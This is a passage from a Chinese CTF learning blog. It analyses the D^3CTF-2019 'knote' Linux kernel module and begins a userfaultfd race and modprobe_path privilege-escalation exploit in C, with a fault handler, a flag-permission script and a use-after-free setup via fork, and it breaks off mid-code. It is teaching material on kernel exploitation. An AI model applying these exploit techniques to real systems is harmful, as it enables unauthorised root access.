<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> &#123;</span></span><br><span class="line">	<span class="type">void</span> **freelist;	<span class="comment">/* Pointer to next available object */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> tid;	<span class="comment">/* Globally unique transaction id */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span>	<span class="comment">/* The slab from which we are allocating */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">partial</span>;</span>	<span class="comment">/* Partially allocated frozen slabs */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">local_lock_t</span> lock;	<span class="comment">/* Protects the fields above */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_STATS</span></span><br><span class="line">	<span class="type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>结构如下图所示（图片选自<a target="_blank" rel="noopener" href="https://blog.csdn.net/whenloce/article/details/88949002?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166522587916800182720892%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166522587916800182720892&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-3-88949002-null-null.142%5Ev52%5Ejs_top,201%5Ev3%5Econtrol_1&amp;utm_term=slub&amp;spm=1018.2226.3001.4187">资料</a>）</p>
<p><img src="4.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3doZW5sb2Nl,size_16,color_FFFFFF,t_70" alt="" /><br />
其中需要重点关注的就是<code>freelist</code>，里面保存的就是对象本身，以链表连接。在上一篇文章中，我们使用了SLUB的结构特性实现了利用，在那道题中，读者可以进行调试发现，对象内部的内容非常简单，空闲的对象开头8字节保存的就是下一个空闲对象的地址，以链表形式连接，在释放一个对象时，会将该对象放在<code>freelist</code>链表头部。这也就是为什么在上一题中通过修改指针的值就可以让SLUB为我们分配到任意地址了。<strong>在实际的pwn利用中，有一个思路就是恶意篡改SLUB中的<code>freelist</code>，破坏链表以实现任意地址分配，后续可能可以进行任意地址读写</strong>。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-7/" class="post-title-link" itemprop="url">Kernel pwn 入门 (7)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:33:36" itemprop="dateCreated datePublished" datetime="2023-02-28T22:33:36+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:43" itemprop="dateModified" datetime="2023-03-01T11:30:43+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>13k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>12 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本篇文章中，我们会练习回顾上一篇文章中学到的<strong>userfaultfd</strong>利用方式，同时学习一种新的利用方式：<strong>modprobe_path</strong>。使用的例题是：<font color=red><strong>D^3CTF-2019 knote</strong></font>，需要两种利用配合使用。下面我们对本题进行分析。题目下载地址：<a target="_blank" rel="noopener" href="https://arttnba3.cn/download/d3ctf2019/knote.7z">下载</a>。再次感谢Arttnba3师傅的博客。</p>
<h1 id="0x1-ko文件分析"><a class="markdownIt-Anchor" href="#0x1-ko文件分析"></a> 0x1: .ko文件分析</h1>
<p>当然，在利用之前，我们首先还是需要将这个ko文件过一遍。</p>
<h2 id="file_operations"><a class="markdownIt-Anchor" href="#file_operations"></a> file_operations</h2>
<p><img src="1.png" alt="" /><br />
可以看到fops中定义有ioctl函数和open函数的入口，另外由于release函数的起始地址为0，因此这里的所有0都可以看做release函数入口。</p>
<h2 id="ioctl"><a class="markdownIt-Anchor" href="#ioctl"></a> ioctl</h2>
<p>分析ioctl函数可知，一共定义了以下几种入口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cmd=0x2333: 执行get函数</span><br><span class="line">cmd=0x1337: 执行add函数</span><br><span class="line">cmd=0x6666: 执行dele函数</span><br><span class="line">cmd=0x8888: 执行edit函数</span><br></pre></td></tr></table></figure>
<h2 id="get"><a class="markdownIt-Anchor" href="#get"></a> get</h2>
<p><img src="2.png" alt="" /><br />
出现了一个mychunk的东西，因此本题和堆有关系。前面if的意思应该是所有chunk的数量不能超过9。在函数中还出现了一个<code>copy_user_generic_unrolled</code>函数，查看<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v5.3.6/source/arch/x86/lib/copy_user_64.S#L56">源码</a>可知其第一个参数是dest，第二个参数是src，第三个参数是count，和<code>copy_to_user</code>、<code>copy_from_user</code>功能相似。这里看到ptr实际上是<code>get</code>函数的第二个参数，因此也就是将第二个参数（用户地址）中的内容拷贝到<code>mychunk.ptr</code>中。</p>
<p><img src="3.png" alt="" /><br />
这就是chunk的结构，其中<code>_anon_0</code>的名字很长的类型是一个联合体，有<code>size</code>和<code>idx</code>两个类型可以表示，为方便将类型名改为<code>info</code>。</p>
<p>因此，<code>get</code>函数就是从用户内存中拷贝内容到分配好的chunk中。</p>
<h2 id="add"><a class="markdownIt-Anchor" href="#add"></a> add</h2>
<p><img src="4.png" alt="" /><br />
在<code>add</code>函数中，可以看到在一开始加了一个读锁。在之后又加了一个写锁。</p>
<p>函数中还调用了<code>_InterlockedExchangeAdd</code>函数，笔者查到的文章中关于这个函数都是Windows下的API，大概的含义是线程互锁下的相加操作。这里将读写锁的值减去200，原因暂时未知。</p>
<p>之后则是通过<code>kmalloc</code>进行内核堆空间分配，后面的<code>my_rwlock.raw_lock._anon_0._anon_0.wlocked = 0;</code>应该表示的是解除写锁。</p>
<h2 id="dele"><a class="markdownIt-Anchor" href="#dele"></a> dele</h2>
<p><img src="5.png" alt="" /><br />
堆空间释放函数同样使用了读写锁，在释放之后将<code>size</code>和<code>ptr</code>均清空。</p>
<h2 id="edit"><a class="markdownIt-Anchor" href="#edit"></a> edit</h2>
<p><img src="6.png" alt="" /><br />
这里同样使用了<code>copy_user_generic_unrolled</code>这个函数，但根据参数来判断，这里应该是和<code>copy_to_user</code>函数的含义相同。</p>
<h2 id="knote_open"><a class="markdownIt-Anchor" href="#knote_open"></a> knote_open</h2>
<p><img src="7.png" alt="" /><br />
在这个函数中，通过<code>raw_write_lock</code>函数设定<code>my_rwlock</code>为写锁，不允许其他线程读写<code>in_use</code>。</p>
<h1 id="0x2-init和startsh文件分析"><a class="markdownIt-Anchor" href="#0x2-init和startsh文件分析"></a> 0x2. init和start.sh文件分析</h1>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;&#123;==DBG==&#125; INIT SCRIPT&quot;</span></span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line"><span class="built_in">mkdir</span> /dev/pts</span><br><span class="line">mount -t devpts devpts /dev/pts</span><br><span class="line"></span><br><span class="line">mdev -s</span><br><span class="line"><span class="built_in">exec</span> 0&lt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 1&gt;/dev/console</span><br><span class="line"><span class="built_in">exec</span> 2&gt;/dev/console</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;&#123;==DBG==&#125; Boot took <span class="subst">$(cut -d&#x27; &#x27; -f1 /proc/uptime)</span> seconds&quot;</span></span><br><span class="line">insmod note.ko</span><br><span class="line"><span class="built_in">mknod</span> /dev/knote c 10 233</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/knote</span><br><span class="line"><span class="built_in">chmod</span> 666 /dev/ptmx</span><br><span class="line"><span class="built_in">chown</span> 0:0 /flag</span><br><span class="line"><span class="built_in">chmod</span> 400 /flag</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line"></span><br><span class="line"><span class="built_in">chroot</span> . setuidgid 1000 /bin/sh <span class="comment">#normal user</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p>在init文件中，有一些常规的保护措施，如这里的<code>kptr_restrict</code>和<code>dmesg_restrict</code>，都设为1表示对普通用户有限制作用而对root用户没有，因此调试时修改为root用户可以查看kallsyms文件。与之前的题一样，在调试时通过将uid改为0方便调试。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">cd</span> /home/ctf</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 128M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./rootfs.cpio \</span><br><span class="line">-append <span class="string">&quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr&quot;</span> \</span><br><span class="line">-netdev user,<span class="built_in">id</span>=t0, -device e1000,netdev=t0,<span class="built_in">id</span>=nic0 \</span><br><span class="line">-nographic \</span><br><span class="line">-monitor /dev/null \</span><br><span class="line">-smp cores=2,threads=1 \</span><br><span class="line">-cpu qemu64,+smep,+smap</span><br></pre></td></tr></table></figure>
<p>在start.sh文件中，可以看到开启了kaslr、smp保护。添加上-s选项以供调试。</p>
<h1 id="0x3-交互编写"><a class="markdownIt-Anchor" href="#0x3-交互编写"></a> 0x3. 交互编写</h1>
<p>通过<code>ioctl</code>函数可知，<code>mychunk</code>实际上就是我们传入<code>ioctl</code>函数的第三个参数，这个<code>chunk</code>结构体会被根据不同的函数进行不同的操作。因此我们可以先将程序的交互写好，再去分析具体的漏洞。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> GET 0x2333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD 0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT 0x8888</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL 0x6666</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info = &#123;</span><br><span class="line">                    .index = index,</span><br><span class="line">            &#125;,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, GET, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> size)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info = &#123;</span><br><span class="line">                    .size = size,</span><br><span class="line">            &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, ADD, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dele</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info = &#123;</span><br><span class="line">                    .index = index,</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, DEL, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info = &#123;</span><br><span class="line">                    .index = index,</span><br><span class="line">            &#125;,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, EDIT, &amp;in);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="0x4-漏洞分析与利用"><a class="markdownIt-Anchor" href="#0x4-漏洞分析与利用"></a> 0x4. 漏洞分析与利用</h1>
<h2 id="1-通过userfaultfd获取内核基地址"><a class="markdownIt-Anchor" href="#1-通过userfaultfd获取内核基地址"></a> 1. 通过<code>userfaultfd</code>获取内核基地址</h2>
<p>在本题中，核心的操作就是<code>get</code>、<code>add</code>、<code>edit</code>、<code>dele</code>这4个。其中<code>get</code>和<code>edit</code>函数没有加锁，<code>dele</code>和<code>add</code>都加了写锁。通过<code>get</code>或<code>edit</code>函数可以传入一个mmap出来的用户空间，然后触发<code>userfaultfd</code>。那么在条件竞争的这个时间窗口，我们又需要做什么呢？和上一题相似，也是重复打开<code>/dev/ptmx</code>文件，尝试使用同样的方法进行利用。下面是我们的第一个测试程序（kernel.h请参考<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I">资料</a>中提到的通用kernel pwn板子，<code>print_binary</code>请参考笔者之前的kernel pwn文章）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by ubuntu on 22-10-5.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">input</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">        <span class="type">size_t</span> size;</span><br><span class="line">        <span class="type">size_t</span> index;</span><br><span class="line">    &#125;info;</span><br><span class="line">    <span class="type">char</span>* buf;</span><br><span class="line">&#125;input;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET 0x2333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD 0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT 0x8888</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL 0x6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* faultBuffer;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, GET, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> size)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.size = size,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, ADD, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dele</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, DEL, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, EDIT, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Parent process stopped here.&quot;</span> CEND);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                          ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    page = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="string">&#x27;0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    faultBuffer = (<span class="type">char</span>*)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(faultBuffer, <span class="number">0x1000</span>, (<span class="type">void</span>*)fault_handler_thread);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> shellFile = open(<span class="string">&quot;/getFlag&quot;</span>, O_RDWR | O_CREAT);</span><br><span class="line">    <span class="type">char</span>* shellCode = <span class="string">&quot;#!/bin/sh\n&quot;</span></span><br><span class="line">                      <span class="string">&quot;chmod 777 /flag&quot;</span>;</span><br><span class="line">    write(shellFile, shellCode, <span class="built_in">strlen</span>(shellCode));</span><br><span class="line">    close(shellFile);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /getFlag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/knote&quot;</span>, O_RDWR);</span><br><span class="line">    add(TTY_STRUCT_SIZE);</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Fork failed&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Child process sleeping...&quot;</span> CEND);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to delete note in child process...&quot;</span> CEND);</span><br><span class="line">        dele(<span class="number">0</span>);</span><br><span class="line">        